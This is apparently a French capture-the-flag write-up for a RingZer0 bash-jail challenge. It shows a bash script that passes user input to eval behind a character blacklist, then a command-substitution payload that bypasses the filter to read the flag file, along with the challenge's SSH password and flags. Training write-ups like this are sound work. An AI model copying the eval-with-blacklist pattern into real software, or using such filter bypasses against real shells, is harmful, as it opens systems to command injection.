ssh level2@challenges.ringzer0ctf.com -p 10219

Mot de passe: FLAG-U96l4k6m72a051GgE5EN0rA85499172K


Le script cette fois est :

```bash
Flag is located at /home/level2/flag.txt

Challenge bash code:

function check_space {
	if [[ $1 == *[bdks';''&'' ']* ]]
	then 	
    		return 0
	fi

	return 1
}

while :
do
	echo "Your input:"
	read input
	if check_space "$input" 
	then
		echo -e '\033[0;31mRestricted characters has been used\033[0m'
	else
		output="echo Your command is: $input"
		eval $output
	fi
done 

```

Plusieurs caractères sont banni  b d k s ; & et l'espace

Donc avec la commande 
```bash
$(cat</home/level2/flag.txt)
```
On réussi à obtenir le flag:
Your command is: FLAG-a78i8TFD60z3825292rJ9JK12gIyVI5P